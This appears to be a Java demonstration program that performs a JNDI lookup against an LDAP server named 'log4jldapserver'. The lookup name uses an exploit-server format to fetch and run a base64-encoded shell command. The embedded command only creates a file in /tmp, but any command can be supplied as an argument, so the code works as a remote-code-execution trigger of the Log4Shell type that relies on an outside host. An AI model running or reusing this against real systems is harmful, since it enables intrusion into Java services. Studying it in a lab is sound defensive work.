import java.util.Properties;
import javax.naming.*;

public class LdapLookup {
  public static void main(String[] args) {
    String name = "Basic/Command/Base64/dG91Y2ggL3RtcC9DeWdlbnRhRGVtbw==";
    // String name = "";
    if (args.length > 0) name = args[0];
    try { // Create a Properties object and set properties appropriately
      Properties props = new Properties();
      props.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
      props.put(Context.PROVIDER_URL, "ldap://log4jldapserver:1389");
      props.put(Context.SECURITY_AUTHENTICATION, "simple");

      Context ctx = new InitialContext(props);

      Object obj = ctx.lookup(name);
      
      // ctx.bind("foo", "cn="+name);

      // Object local_obj = ctx.lookup("foo");


      // Look up the object
      // Object obj = initialContext.lookup("dn="+name);
      // if (name.equals(""))
	    //   System.out.println("Looked up the initial context");
      // else
      //   System.out.println(name + " is bound to: " + obj);
    } catch (NamingException nnfe) {
      System.out.println("Encountered a naming exception");
    }
  }
}
